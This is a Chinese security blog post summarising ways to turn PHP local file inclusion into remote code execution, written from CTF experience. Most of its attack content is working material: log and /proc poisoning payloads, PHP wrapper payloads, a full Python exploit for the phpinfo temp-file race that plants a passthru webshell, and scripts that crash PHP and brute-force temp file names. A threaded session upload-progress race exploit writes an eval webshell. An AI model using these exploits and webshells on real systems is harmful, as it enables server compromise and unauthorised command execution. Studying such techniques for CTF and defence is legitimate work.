> 原文链接: https://www.anquanke.com//post/id/177491 


# LFItoRCE利用总结


                                阅读量   
                                **200233**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t013764d22a849a5960.png)](https://p0.ssl.qhimg.com/t013764d22a849a5960.png)



LFI不止可以来读取文件，还能用来RCE

在多道CTF题目中都有LFItoRCE的非预期解，下面总结一下LFI的利用姿势



## /proc/self/environ

**需要有`/proc/self/environ`的读取权限**

如果可以读取，修改`User-Agent`为php代码，然后lfi点包含，实现rce



## /proc/self/fd/1,2,3…

**需要有`/proc/self/fd/1`的读取权限**

类似于`/proc/self/environ`，不同是在`referer`或报错等写入php代码，然后lfi点包含，实现rce



## php伪协议

[![](https://s2.ax1x.com/2019/04/25/Eetx3V.png)](https://s2.ax1x.com/2019/04/25/Eetx3V.png)



### <a class="reference-link" name="php://filter"></a>php://filter

用来读文件 [https://www.php.net/manual/zh/filters.php](https://www.php.net/manual/zh/filters.php)

不需要`allow_url_include`和`allow_url_fopen`开启
- `php://filter/read=convert.base64-encode/resource=`


### <a class="reference-link" name="php://input"></a>php://input

可以实现代码执行

需要`allow_url_include：on`



### <a class="reference-link" name="data://"></a>data://

需要`allow_url_fopen`,`allow_url_include`均开启
- `data://text/plain,&lt;?php phpinfo()?&gt;`
- `data:text/plain,&lt;?php phpinfo()?&gt;`
- `data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`
- `d·ata:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`


### <a class="reference-link" name="expect://"></a>expect://

默认不开启，需要安装PECL package扩展<br>
需要`allow_url_include`开启

`expect://[command]`



## /var/log/…

### <a class="reference-link" name="ssh%E6%97%A5%E5%BF%97"></a>ssh日志

**需要有`/var/log/auth.log`的读取权限**

如果目标机开启了ssh，可以通过包含ssh日志的方式来getshell

连接ssh时输入`ssh `&lt;?php phpinfo(); ?&gt;`[@192](https://github.com/192).168.211.146` php代码便会保存在`/var/log/auth.log`中

然后lfi点包含，实现rce



### <a class="reference-link" name="apache%E6%97%A5%E5%BF%97"></a>apache日志

**需要有`/var/log/apache2/...`的读取权限**

包含`access.log`和`error.log`来rce

但log文件过大会超时返回500，利用失败

更多日志文件地址见：[https://github.com/tennc/fuzzdb/blob/master/attack-payloads/lfi/common-unix-httpd-log-locations.txt](https://github.com/tennc/fuzzdb/blob/master/attack-payloads/lfi/common-unix-httpd-log-locations.txt)



## with phpinfo

PHP引擎对`enctype="multipart/form-data"`这种请求的处理过程如下
1. 请求到达；
<li>创建临时文件，并写入上传文件的内容；文件为`/tmp/php[w]`{`6`}``
</li>
1. 调用相应PHP脚本进行处理，如校验名称、大小等；
1. 删除临时文件。
构造一个html文件来发送上传文件的数据包

```
&lt;form action="http://192.168.211.146/phpinfo.php" method="post"
enctype="multipart/form-data"&gt;
&lt;label for="file"&gt;Filename:&lt;/label&gt;
&lt;input type="file" name="file" id="file" /&gt; 
&lt;br /&gt;
&lt;input type="submit" name="submit" value="Submit" /&gt;
&lt;/form&gt;
```

`phpinfo`可以输出`$_FILES`信息，包括临时文件路径、名称

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/04/26/EniKRx.png)

可以通过分块传输编码，发送大量数据来争取时间，在临时文件删除之前执行包含操作

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/04/26/EniuJ1.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/04/26/EniniR.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/04/26/Enieo9.png)

[https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) 中的exp：

```
#!/usr/bin/python
import sys
import threading
import socket
def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%sr
&lt;?php $c=fopen('/tmp/g','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"r
Content-Type: text/plainr
r
%s
-----------------------------7dbff1ded0714--r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""r
HTTP_ACCEPT: """ + padding + """r
HTTP_USER_AGENT: """+padding+"""r
HTTP_ACCEPT_LANGUAGE: """+padding+"""r
HTTP_PRAGMA: """+padding+"""r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r
Content-Length: %sr
Host: %sr
r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script
#     LFIREQ="""GET /lfi.php?file=%s%%00 HTTP/1.1r
# User-Agent: Mozilla/4.0r
# Proxy-Connection: Keep-Aliver
# Host: %sr
# r
# r
# """
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1r
User-Agent: Mozilla/4.0r
Proxy-Connection: Keep-Aliver
Host: %sr
r
r
"""
    return (REQ1, TAG, LFIREQ)
def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s2.connect((host, port))
    s.send(phpinforeq)
    d = ""
    while len(d) &lt; offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&amp;gt")
        fn = d[i+17:i+31]
        # print fn
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()
    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args
    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter &gt;= self.maxattempts:
                    return
                counter+=1
            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "nGot it! Shell created in /tmp/g"
                    self.event.set()
            except socket.error:
                return
def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    d = ""
    while True:
        i = s.recv(4096)
        d+=i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0rnrn"):
            break
    s.close()
    i = d.find("[tmp_name] =&amp;gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256
def main():
    print "LFI With PHPInfo()"
    print "-=" * 30
    if len(sys.argv) &lt; 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)
    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()
    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()
    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()
    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter &gt;= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot! m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "nTelling threads to shutdown..."
        e.set()
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```



## with php崩溃

### <a class="reference-link" name="php%20Segfault"></a>php Segfault

向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留

**1. php &lt; 7.2**
- `php://filter/string.strip_tags/resource=/etc/passwd`
**2. php7 老版本通杀**
- `php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA`
更新之后的版本已经修复，不会再使php崩溃了，这里我使用老版本来测试可以利用

**包含上面两条payload可以使php崩溃，请求中同时存在一个上传文件的请求则会使临时文件保存，然后爆破临时文件名，包含来rce**

**payload1测试：**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/04/26/EnhwdJ.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/04/29/E3VzvD.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s2.ax1x.com/2019/04/26/EnhULF.png)

**payload2测试：**

[![](https://s2.ax1x.com/2019/04/26/EnhdZ4.png)](https://s2.ax1x.com/2019/04/26/EnhdZ4.png)

exp:

```
# -*- coding: utf-8 -*-
# php崩溃 生成大量临时文件

import requests
import string

def upload_file(url, file_content):
    files = `{`'file': ('daolgts.jpg', file_content, 'image/jpeg')`}`
    try:
        requests.post(url, files=files)
    except Exception as e:
        print e

charset = string.digits+string.letters
webshell = '&lt;?php eval($_REQUEST[daolgts]);?&gt;'.encode("base64").strip()
file_content = '&lt;?php if(file_put_contents("/tmp/daolgts", base64_decode("%s")))`{`echo "success";`}`?&gt;' % (webshell)

url="http://192.168.211.146/lfi.php"
parameter="file"
payload1="php://filter/string.strip_tags/resource=/etc/passwd"
payload2=r"php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA"
lfi_url = url+"?"+parameter+"="+payload1
length = 6
times = len(charset) ** (length / 2)
for i in xrange(times):
    print "[+] %d / %d" % (i, times)
    upload_file(lfi_url, file_content)
```

### <a class="reference-link" name="%E7%88%86%E7%A0%B4tmp%E6%96%87%E4%BB%B6%E5%90%8D"></a>爆破tmp文件名

然后爆破临时文件名来包含

```
# -*- coding: utf-8 -*-
import requests
import string

charset = string.digits + string.letters
base_url="http://192.168.211.146/lfi.php"
parameter="file"

for i in charset:
    for j in charset:
        for k in charset:
            for l in charset:
                for m in charset:
                    for n in charset:
                        filename = i + j + k + l + m + n
                        url = base_url+"?"+parameter+"=/tmp/php"+filename
                        print url
                        try:
                            response = requests.get(url)
                            if 'success' in response.content:
                                print "[+] Include success!"
                                print "url:"+url
                                exit()
                        except Exception as e:
                            print e
```



## session

如果`session.upload_progress.enabled=On`开启，就可以包含session来getshell,并且这个参数在php中是默认开启的

[https://php.net/manual/zh/session.upload-progress.php](https://php.net/manual/zh/session.upload-progress.php)

> 当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时，上传进度可以在`$_SESSION`中获得。 当PHP检测到这种POST请求时，它会在`$_SESSION`中添加一组数据, 索引是 `session.upload_progress.prefix`与`session.upload_progress.name`连接在一起的值。

也就是说session中会添加`session.upload_progress.prefix`+`$_POST[ini_get['session.upload_progress.name']]`,而`session.upload_progress.name`是可控的，所以就可以在session写入php代码，然后包含session文件来rce

`session.upload_progress.prefix`和`session.upload_progress.name`还有session的储存位置`session.save_path`都能在phpinfo中获取，默认为:

[![](https://s2.ax1x.com/2019/04/29/E1xklt.png)](https://s2.ax1x.com/2019/04/29/E1xklt.png)

同时能看到`session.upload_progress.cleanup`是默认开启的，这个配置就是POST请求结束后会把session清空，所以session的存在时间很短，需要条件竞争来读取

下面测试一下，构造一个html来发包

```
&lt;form action="http://192.168.211.146/phpinfo.php" method="POST" enctype="multipart/form-data"&gt;
 &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="&lt;?php phpinfo(); ?&gt;" /&gt;
 &lt;input type="file" name="file1" /&gt;
 &lt;input type="file" name="file2" /&gt;
 &lt;input type="submit" /&gt;
&lt;/form&gt;
```

在数据包里加入`PHPSESSION`，才能生成session文件

burp不断发包，成功包含

[![](https://s2.ax1x.com/2019/04/29/E3ZrPx.png)](https://s2.ax1x.com/2019/04/29/E3ZrPx.png)

exp:

```
import requests
import threading

webshell = '&lt;?php eval($_REQUEST[daolgts]);?&gt;'.encode("base64").strip()
file_content = '&lt;?php if(file_put_contents("/tmp/daolgts", base64_decode("%s")))`{`echo "success";`}`?&gt;' % (webshell)

url='http://192.168.211.146/lfi.php'
r=requests.session()

def POST():
    while True:
        file=`{`
            "upload":('daolgts.jpg', file_content, 'image/jpeg')
        `}`
        data=`{`
            "PHP_SESSION_UPLOAD_PROGRESS":file_content
        `}`
        headers=`{`
            "Cookie":'PHPSESSID=123456'
        `}`
        r.post(url,files=file,headers=headers,data=data)

def READ():
    while True:
        event.wait()
        t=r.get("http://192.168.211.146/lfi.php?file=/var/lib/php/sessions/sess_123456")
        if 'success' not in t.text:
            print('[+]retry')
        else:
            print(t.text)
            event.clear()
event=threading.Event()
event.set()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
```



## LFI自动化利用工具
- [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
会自动扫描利用以下漏洞，并且获取到shell
- /proc/self/environ
- php://filter
- php://input
- /proc/self/fd
- access log
- phpinfo
- data://
- expect://


## Referer
- [https://www.colabug.com/5003801.html](https://www.colabug.com/5003801.html)
- [https://www.jianshu.com/p/dfd049924258](https://www.jianshu.com/p/dfd049924258)
- [https://www.anquanke.com/post/id/167219](https://www.anquanke.com/post/id/167219)